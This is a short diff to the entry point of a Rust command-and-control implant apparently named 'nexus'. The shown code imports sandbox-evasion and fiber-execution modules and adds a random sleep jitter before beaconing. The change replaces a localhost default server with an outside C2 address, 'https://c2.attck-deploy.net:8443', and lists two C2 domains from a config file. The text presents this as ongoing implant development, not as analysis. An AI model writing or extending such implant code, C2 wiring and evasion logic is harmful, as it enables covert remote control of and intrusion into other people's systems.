@@ -1,6 +1,5 @@
 use nexus_common::*;
 use std::env;
-use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
 
@@ -15,7 +14,6 @@ mod evasion;
 mod fiber_execution;
 
 use agent::NexusAgent;
-use communication::NetworkClient;
 use evasion::EnvironmentChecker;
 
 #[tokio::main]
@@ -34,13 +32,14 @@ async fn main() -> Result<()> {
     let jitter = rand::random::<u64>() % 30 + 10;
     sleep(Duration::from_secs(jitter)).await;
 
-    // Parse command line arguments
+    // Parse command line arguments or use primary domain from configuration
     let args: Vec<String> = env::args().collect();
     let server_addr = if args.len() > 1 {
         args[1].clone()
     } else {
-        // Default C2 server address (should be configured at build time)
-        "127.0.0.1:4444".to_string()
+        // Use primary domain from configuration with gRPC port
+        // Primary domains from nexus.toml: ["c2.attck-deploy.net", "api.attck-deploy.net"]
+        "https://c2.attck-deploy.net:8443".to_string()
     };
 
     // Create encryption key (in production, this should be embedded or derived)
